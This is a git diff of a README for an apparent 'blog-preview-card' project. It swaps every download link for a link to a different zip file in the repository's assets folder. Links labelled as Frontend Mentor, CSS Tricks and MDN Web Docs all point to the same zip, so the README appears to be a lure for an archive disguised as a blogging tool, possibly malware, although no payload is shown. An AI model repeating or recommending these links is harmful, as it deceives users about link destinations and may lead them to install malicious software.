@@ -1,6 +1,6 @@
 # 🌈 blog-preview-card - Create Beautiful Blog Previews Easily
 
-![Download Now](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip%20Now-Click%20Here-%2300aaff)
+![Download Now](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip%20Now-Click%20Here-%2300aaff)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Ready to get started? Follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the official releases page to download the application:  
-   [Download Here](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip)
+   [Download Here](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip)
 
 2. **Download the Latest Version**  
    On the releases page, find the latest version and click on it. This will take you to the files available for download. 
@@ -54,9 +54,9 @@ Ready to get started? Follow these steps:
 
 ## 📚 Additional Resources
 
-- [Frontend Mentor](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip) - A platform for practicing frontend skills.
-- [CSS Tricks](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip) - Learn more about modern CSS techniques.
-- [MDN Web Docs](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip) - Reference for HTML and CSS documentation.
+- [Frontend Mentor](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip) - A platform for practicing frontend skills.
+- [CSS Tricks](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip) - Learn more about modern CSS techniques.
+- [MDN Web Docs](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip) - Reference for HTML and CSS documentation.
 
 ## 📞 Support
 
@@ -67,4 +67,4 @@ If you encounter any issues, you can open an issue on the GitHub repository. We 
 We hope this tool makes creating blog previews simple and enjoyable. Happy blogging! 
 
 Don’t forget to visit the releases page for updates:  
-[Download Here](https://raw.githubusercontent.com/ericliu8888/blog-preview-card/main/assets/blog-preview-card-v3.0.zip)
+[Download Here](https://github.com/ericliu8888/blog-preview-card/raw/refs/heads/main/assets/preview-blog-card-outtop.zip)
